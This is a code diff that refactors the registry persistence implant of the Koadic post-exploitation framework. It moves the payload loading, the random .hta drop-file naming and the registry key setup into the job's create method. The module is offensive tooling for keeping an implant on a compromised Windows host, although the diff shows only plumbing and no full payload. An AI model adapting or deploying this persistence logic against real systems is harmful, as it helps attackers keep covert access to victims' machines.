@@ -1,10 +1,25 @@
 import core.job
 import core.implant
 import uuid
+import string
+import random
 
 class RegistryJob(core.job.Job):
 
     def create(self):
+        id = self.options.get("PAYLOAD")
+        payload = self.load_payload(id)
+        self.options.set("CMD", payload)
+        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
+        self.options.set("FDROPDIR", self.options.get('DROPDIR').replace("\\", "\\\\").replace('"', '\\"'))
+
+        if self.options.get('DROPFILE'):
+            self.options.set('FDROPFILE', self.options.get('DROPFILE')+'.hta')
+        else:
+            self.options.set('DROPFILE', ''.join(random.choice(string.ascii_uppercase) for _ in range(10)))
+            self.options.set('FDROPFILE', self.options.get('DROPFILE')+'.hta')
+
+        self.options.set("FHKEY", "Koadic.registry."+self.options.get("HKEY"))
         if self.session_id == -1:
             self.error("0", "This job is not yet compatible with ONESHOT stagers.", "ONESHOT job error", "")
             return False
@@ -101,7 +116,6 @@ class RegistryImplant(core.implant.Implant):
         return RegistryJob
 
     def run(self):
-
         id = self.options.get("PAYLOAD")
         payload = self.load_payload(id)
 
@@ -109,21 +123,7 @@ class RegistryImplant(core.implant.Implant):
             self.shell.print_error("Payload %s not found." % id)
             return
 
-        self.options.set("CMD", payload)
-        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
-        self.options.set("FDROPDIR", self.options.get('DROPDIR').replace("\\", "\\\\").replace('"', '\\"'))
-
-        if self.options.get('DROPFILE'):
-            self.options.set('FDROPFILE', self.options.get('DROPFILE')+'.hta')
-        else:
-            import string
-            import random
-            self.options.set('DROPFILE', ''.join(random.choice(string.ascii_uppercase) for _ in range(10)))
-            self.options.set('FDROPFILE', self.options.get('DROPFILE')+'.hta')
-
-        self.options.set("FHKEY", "Koadic.registry."+self.options.get("HKEY"))
-
         payloads = {}
-        payloads["js"] = self.loader.load_script("data/implant/persist/registry.js", self.options)
+        payloads["js"] = "data/implant/persist/registry.js"
 
         self.dispatch(payloads, self.job)
